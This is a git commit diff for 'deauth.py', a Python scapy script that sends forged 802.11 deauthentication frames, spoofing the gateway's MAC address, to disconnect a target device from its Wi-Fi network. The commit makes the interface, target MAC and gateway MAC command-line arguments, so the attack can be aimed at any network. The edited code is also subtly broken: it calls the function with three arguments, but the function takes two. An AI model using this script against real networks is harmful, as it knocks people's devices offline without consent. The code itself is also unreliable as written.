4adaabd71c87f490c060b5315a3313c24e9c2d47
Ilan Grodinsky <ilan7gr@gmail.com>
2025-09-02 02:17:28 +0300

    made the script use sys args for the MAC addresses and interface

--- deauth.py
+++ deauth.py
@@ -1,4 +1,5 @@
-from scapy.all import Dot11, RadioTap, Dot11Deauth, sendp, getmacbyip
+import sys
+from scapy.all import Dot11, RadioTap, Dot11Deauth, sendp
 
 def deauth(target_mac, gateway_mac):
     # addr1: target MAC
@@ -7,8 +8,13 @@ def deauth(target_mac, gateway_mac):
     dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
     packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
 
-    sendp(packet, inter=0.1, count=200, iface='Ethernet')
+    sendp(packet, inter=0.1, count=200, iface=interface)
 
 
 if __name__ == '__main__':
-    deauth('ex:am:pl:em:ac', 'ex:am:pl:em:ac')
+    interface = sys.argv[1]
+    target_mac = sys.argv[2]
+    gateway_mac = sys.argv[3]
+        
+
+    deauth(target_mac, gateway_mac, interface)
